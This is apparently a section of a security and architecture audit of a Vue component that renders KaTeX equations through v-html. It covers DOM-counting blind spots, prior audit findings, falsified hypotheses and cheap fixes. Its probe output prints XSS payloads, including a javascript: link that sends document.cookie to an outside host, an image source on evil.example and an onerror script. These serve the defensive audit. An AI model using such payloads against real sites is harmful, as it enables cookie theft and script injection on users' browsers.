**Applied to this component — three tiers, all three present in this one directory:**

| Tier | Example | Visible to which deriver? |
|---|---|---|
| Component-callsite loop | `NotationPills.vue:17-18` — `<Button v-for="opt in NOTATION_OPTIONS">` | **Visible** (the R5-7 populated-leaf shape; cf. the intake's own `FunctionInput.vue:157:Tooltip` exemplar) |
| Native-element loop | `convergence/ConvergenceLegend.vue:29-30` — `<div v-for="(h, i) in harmonics">` | **Invisible pre-R6-5; visible only under `NATIVE_TEMPLATE_LOOP`** |
| **`v-html`-injected subtree** | **`EquationResult.vue:37`** | **Invisible to BOTH families** |

**The extension this component forces.** `EquationResult.vue` contains **no `v-for` at all** — so R5-7 in its
literal form does not fire here, and a lane that only asks "does this file loop over native elements?" scores it
clean. It is not clean: the third invisibility mode is worse than the second, because the injected DOM never
enters the SFC template AST in any form, so **no** AST-derived instance model — component-callsite or
native-element — can see it. Quantified, source-derived (probe A/ and G/, repo's own katex, backend-faithful
latex from `latex_rendering.py:174-192`):

- sigma mode → **107 `<span>` elements, 5 068 bytes** from one template node;
- expanded mode → **1336 `<span>` elements, 58 459 bytes** from that same one node.

So a per-component D/L/C denominator built from the template counts **1** where the live DOM carries up to
**1336** — a 1336× undercount, and the *interactive* elements live inside it: the `.eq-coeff` spans that
`useCoeffHover.ts:29` hit-tests and `EquationView.vue:414-423` styles are **only** in the invisible region
(probe A/: 4 `eq-coeff` occurrences under `trust:true`, 2 residual/broken under `trust:false`).

**Fourier-wide scale, measured:** `grep -rn "v-html" web/src --include="*.vue" | wc -l` → **10** sites, of which
four are KaTeX (`EquationResult.vue:37`, `EquationPanel.vue:111`, `ConvergencePlot.vue:353`,
`EquationView.vue:264`) and four are the paper ToC / search highlight family (`PaperView.vue:373`,
`PaperSidebar.vue:80,100,116`, `PaperSearchDropdown.vue:58`, `PaperSearchModal.vue:100`) — note that
`PaperSidebar.vue:80/100/116` are `v-html` spans **nested inside** the very native `li v-for` loops at
`:65/:87/:105` that R6-5 authenticated, so the two invisibility modes compound in the file R5-7 was discovered
on.

**Carry for F.W4:** the R6-5 `NATIVE_TEMPLATE_LOOP` family is necessary and **not sufficient**. Any instance
denominator must additionally declare a `V_HTML_OPAQUE` posture — either excluding those subtrees from the
denominator explicitly (with the count of excluded sites published, = 10) or deriving them from the *producing*
source (here: `latex_rendering.py`), because AST derivation cannot reach them by construction.
**Falsifier:** a deriver that already models `v-html` — the intake's registry fields
(`nativeTemplateLoops: 16`, `nativeTemplateLoopDiagnostics: 17`, intake `:139-140`) name loops only; no
`v-html` family appears in any published leaf.

---

## §5 — The viz render path, where this component touches it

The census fixes the architecture: `CENSUS-2026-08-03.md:85-87` — *"Canvas2D throughout, **WebGL/WebGPU
ABSENT**; three independent canvases (epicycle instrument reactive-redraw off a store rAF clock;
**ConvergencePlot with its own ungated rAF**; FrequencyGraph watch-driven) + 12 SVG surfaces"* — and
`:111-113` records both rAF clocks as ungated under `prefers-reduced-motion: reduce`.

**This component owns none of it, and that is the finding.** No `<canvas>`, no 2D context, no WebGL, no rAF, no
`ResizeObserver` (S-1). It touches the viz path in exactly two places, both of them shared-resource contention
rather than ownership:

1. **Frame budget.** It is mounted as a *sibling* of `ConvergencePlot` inside `.eq-panel-right`
   (`EquationView.vue:255` vs `:309`, both under the same `v-else-if="result"` branch at `:237`), and its KaTeX
   render is synchronous on the reactive-flush path while the plot's rAF is running. One API response writes
   both (`EquationView.vue:137-141`). Cost measured at 0.23–1.74 ms of string build plus an unmeasured `v-html`
   DOM cost (L-i1; **UNPROVEN-NEEDS-LIVE**).
2. **The token seam.** Its `z-index: var(--z-controls)` (`:90`) and the plot family's overlays draw from the
   same producer scale (`glass-ui/dist/styles/tokens/scheme-motion.css:336-345`: `--z-controls: 20`,
   `--z-bar: 30`) — which is *correct here*, see H-3 in §7.

**The convergence relevance:** the census's highest-value/highest-risk row is `BasisCanvas` +
`canvas-drawing/` (1 311 LOC Canvas2D) vs glass-ui's GPU-backed `FourierField` (`CENSUS:96-98`). `EquationResult`
is on the *other* side of that seam — pure DOM/typography — so any Canvas↔WebGL convergence work leaves it
untouched. Its only stake in that programme is the frame budget of item 1: an epicycle/field renderer that gets
*more* expensive makes L-i1's synchronous 58 kB `v-html` injection more visible, not less.

---

## §6 — Corpus fold: what I inherited, what I extend, what contradicts

**Folded and re-cited (not re-derived):** FE `:135` (subject row, 101 LOC — matches the live file exactly);
FE `:261-262` (both import lines, live at `:3-4`); FE `:92`, `:131`, `:141` (the three sibling KaTeX sites, all
confirmed live); FE `:108`, `:350-351` (the two other `useClipboard` callsites, both confirmed to drop the
promise); FE `:233` (the six root-barrel symbols); CENSUS `:85-87`, `:111-114` (viz architecture; vitest ABSENT);
intake `:125`, `:139` (R5-7 / R6-5).

**Extended:** R5-7 gets a **third tier** (§4) — `v-html` opacity, invisible to both the original
component-callsite deriver *and* R6-5's `NATIVE_TEMPLATE_LOOP` cure — with a measured 1336× denominator gap and
a 10-site repo census. This is additive to the F.W4 carry at CENSUS `:362`, not a correction of it.

**Prior art from fourier's own audit corpus, all four rows still unremediated at `cd26c65`:**

| Row | Severity (theirs) | Claim | Live status |
|---|---|---|---|
| A5-05 | medium | root-barrel `useClipboard` → move to `/dom`; three files | **UNREMEDIATED** — `EquationResult.vue:4` unchanged (my L-m2) |
| B4-01 | high | `EquationResult.vue:77-86` + `EquationView.vue:386-390` — undersized/clipped hero equation | **UNREMEDIATED** — both ranges byte-identical (my L-M5) |
| D4-03 | high | `useCoeffHover` + absolute `.coeff-popover` duplicates glass-ui `HoverPopover` | **UNREMEDIATED** — and see the contradiction below |
| E5-11 | low | bare `ease` at `EquationResult.vue:97` | **UNREMEDIATED** — unchanged (my L-m6) |

**Contradiction, stated explicitly.** D4-03's evidence string quotes `EquationView.vue:258-265` as
`class="coeff-popover glass-elevated"`. **The live working tree says `glass-floating`** (`EquationView.vue:261`),
changed by the uncommitted W1 glass bump (§0.1). The *finding* survives — the bespoke mouse-tracked popover is
still there, still duplicating `HoverPopover` — but any wave that greps for the prior evidence string will miss
it. Re-pin D4-03's evidence to `glass-floating` before F.W4 uses it.

**One census statement I neither confirm nor contradict, flagged for re-measure:** FE §3's *"zero direct
reka-ui imports … cleanest glass-ui consumer posture in the constellation"* is consistent with everything I read;
this component's single deviation is the root-barrel line (L-m2), which FE `:233` already records. No correction
needed.

**Not previously found anywhere in either corpus:** the `trust: true` configuration (L-B1) and the unescaped
fallback (L-M1). `grep -rln "trust: true" /Users/mkbabb/Programming/fourier-analysis/docs` → **no matches**;
neither the megatranche lanes nor fourier's own five audit runs mention KaTeX's trust surface. These are new.

---

## §7 — Hypotheses the tree falsified (I was wrong six times)

| # | Hypothesis I opened with | Verdict | The evidence that killed it |
|---|---|---|---|
| H-1 | The root-barrel `useClipboard` import (`:4`) breaks under the glass-ui 4→7 uplift, joining the census's break surface | **FALSIFIED** | glass-ui **7.0.0** `dist/index.d.ts:30` still carries `export * from "./composables/dom"`, and its `dist/glass-ui.js` still re-exports `useClipboard`. The 7.0.0 break surface for this file is **empty** — the removals that bite (`metric-badge`, `hover-card`) land on `EquationView.vue:9-10`, not here |
| H-2 | `useClipboard` leaks its 2 000 ms reset timer when the component unmounts mid-window | **FALSIFIED** | compiled impl `useViewportReady-CvBcCYDf.js:76-92` — `return n(o), {...}` registers the clearing function with `onScopeDispose` (import `:1`). Producer-side teardown is correct; this became superlative S-1 |
| H-3 | The copy button (`:88-93`) collides with, or occludes, the parent's info anchor / coefficient popover | **FALSIFIED** | geometry: copy at `right: .5rem`, info at `right: 3.25rem` (`EquationView.vue:432`) — disjoint. Stacking: `--z-controls: 20` vs `--z-bar: 30` (`scheme-motion.css:336-337`), so the popover and info button paint **above** the copy button, which is the correct order. What survives is only the magic-number coupling in L-M4 |
| H-4 | `h-4.5 w-4.5` (`:46-47`) is not a real Tailwind class | **FALSIFIED** | `web/package.json:38` — `tailwindcss ^4.3.1`; v4 generates fractional spacing from the `--spacing` scale dynamically |
| H-5 | `trust: true` is gratuitous and should simply be deleted | **FALSIFIED (partially)** | probe B/ — without trust the equation renders literal `\htmlClass` in KaTeX error red (4 → 2 `eq-coeff` hits, 6 `#cc0000` markers). Trust is load-bearing; the finding therefore became "narrow the predicate" (probe C/: byte-identical output), not "remove it" |
| H-6 | The backend echoes the user's raw expression into `latex`, giving a direct remote XSS | **FALSIFIED** | `symbolic/parsing.py` parses against `SAFE_NAMESPACE` (a whitelist of ~30 sympy symbols) and `render_latex_sigma` (`latex_rendering.py:155-195`) composes only from formatted numbers and fixed macro strings — no raw echo. L-B1's remaining vector is the client-side rehydrate, and it is rated with that precondition stated |

---

## §8 — Reproduction

All read-only. The two probes execute the **repo's own installed** `katex@0.17.0` under `node` — source-derived,
no browser. Probe scripts live outside both repos, in this session's scratchpad
(`…/scratchpad/probe-katex.mjs`, `probe2.mjs`); nothing was written into `fourier-analysis`.

```bash
# subject + collaborators, clean-state check
cd /Users/mkbabb/Programming/fourier-analysis
git rev-parse --short HEAD                                    # cd26c65
git status --porcelain web/src/components/equation/EquationResult.vue   # (empty = clean)

# the four KaTeX sites and the ten v-html sinks
grep -rn "renderToString" web/src --include="*.vue" --include="*.ts"
grep -rn "v-html" web/src --include="*.vue" | wc -l           # 10

# the trust gate in the installed katex
sed -n '364,375p;11084,11095p;11246,11248p;16374,16382p' web/node_modules/katex/dist/katex.mjs

# the composable contract + its teardown
sed -n '9,36p'  web/node_modules/@mkbabb/glass-ui/dist/composables/dom/useClipboard.d.ts
sed -n '76,92p' web/node_modules/@mkbabb/glass-ui/dist/useViewportReady-CvBcCYDf.js

# the narrow subpath exists (L-m2) and the z tokens (H-3)
node -e 'console.log("./dom" in require("./web/node_modules/@mkbabb/glass-ui/package.json").exports)'
grep -n -- "--z-controls:\|--z-bar:" web/node_modules/@mkbabb/glass-ui/dist/styles/tokens/scheme-motion.css

# no CSP; no ESLint
grep -n "add_header" nginx/fourier.conf
ls web/eslint*                                                # no matches
```

**Probe results reproduced verbatim** (`node probe-katex.mjs`, `node probe2.mjs`, stderr = KaTeX's
`strict:'warn'` htmlExtension notices, suppressed):

```
A/ sigma spans: 107 bytes: 5068 | eq-coeff hits: 4
B/ trust:false -> eq-coeff hits: 2 | color:#cc0000 unsupported markers: 6
C/ narrow trust -> eq-coeff hits: 4 | identical to trust:true? true
D/ trust:true  href attr: href="javascript:fetch(&#x27;//x/&#x27;+document.cookie)"
D/ narrow      href attr: (none - blocked)
E/ htmlStyle injected? true | style="position:fixed;inset:0;background:red"
E/ includegraphics src: src="https://evil.example/p.png"
F/ input {} -> THREW TypeError : KaTeX can only parse string typed expression
F2/ fallback emitted: <code><img src=x onerror=alert(document.domain)></code>
G/ expanded spans: 1336 bytes: 58459 | ms expanded: 1.74 ms sigma: 0.23
```

---

## §9 — Disposition

**The component is small, clean-living, and holds exactly one dangerous line.** Its resource hygiene is the best
I have seen in this directory (S-1…S-5) and its size is right. What it gets wrong is concentrated where a
101-line component can still do damage: it grants KaTeX maximal HTML privilege into a `v-html` sink with no CSP
behind it (L-B1), it interpolates raw into that same sink on a reachable error path (L-M1), it re-swallows a
failure its own composable goes out of its way to report (L-M2), and it renders a subtree that three other files
depend on without declaring any of it (L-M4) — while a fourth file, its parent, contradicts its stated no-clip
guarantee (L-M5).

**Ordered remedy, all cheap.** (1) `trust: (ctx) => ctx.command === "\\htmlClass"` — one line, byte-identical
output, closes L-B1. (2) Delete the `catch` fallback string; let KaTeX's `.katex-error` node stand — closes
L-M1. (3) `const r = await copy(...)` with the repo's existing toast, or `onCopyError` — closes L-M2 here and
gives the other two callsites a pattern. (4) Lift one `renderLatex()` into `web/src/lib/equation/` so (1)–(2)
land once for four sites — closes L-M3. (5) Comment at the trust line naming `\htmlClass` and its Python origin,
plus a `.eq-coeff` presence assertion in the (absent) test layer — closes L-M4's silent-break mode.
Steps (1)–(4) are, together, under twenty lines.

**For F.W4:** the `V_HTML_OPAQUE` carry in §4 is the piece that generalises beyond this component — R6-5's
`NATIVE_TEMPLATE_LOOP` family is necessary and not sufficient, and this file is the cleanest proof of it in the
repo (1 template node → 1336 live elements, with the interactive ones inside).
